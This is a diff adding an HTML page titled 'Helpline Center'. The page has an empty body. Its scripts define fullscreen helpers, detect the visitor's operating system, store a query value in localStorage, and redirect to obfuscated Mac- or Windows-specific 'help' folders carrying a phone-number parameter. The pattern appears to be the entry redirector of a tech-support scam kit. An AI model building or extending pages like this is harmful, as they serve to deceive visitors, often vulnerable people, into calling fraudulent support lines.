@@ -1,0 +1,67 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Helpline Center</title>
+    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
+<script>
+  var elem = document.documentElement;
+  function openFullscreen() {
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari */
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { /* IE11 */
+      elem.msRequestFullscreen();
+    }
+  }
+
+  function closeFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) { /* Safari */
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) { /* IE11 */
+      document.msExitFullscreen();
+    }
+  }
+  </script>
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+        function myOperatingSystem() {
+            const userAgent = navigator.userAgent;
+            let os = "Unknown";
+            if (userAgent.indexOf("Win") !== -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                os = "MacOS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") !== -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") !== -1) {
+                os = "iOS";
+            }
+            return os;
+        }
+        let operatingSystem = myOperatingSystem();
+        localStorage.setItem('alpha',getQueryParam('alpha'));
+        if(operatingSystem === 'MacOS'){
+            window.location.href="Ma010chelpAbh1041/index.html?ph0nq="+getQueryParam('ph0nq');
+        }else{
+            window.location.href="Wi010nhelpAbh1041/index.html?ph0nq="+getQueryParam('ph0nq');
+        }
+
+
+
+    </script>
+</head>
+<body>
+
+</body>
+</html>
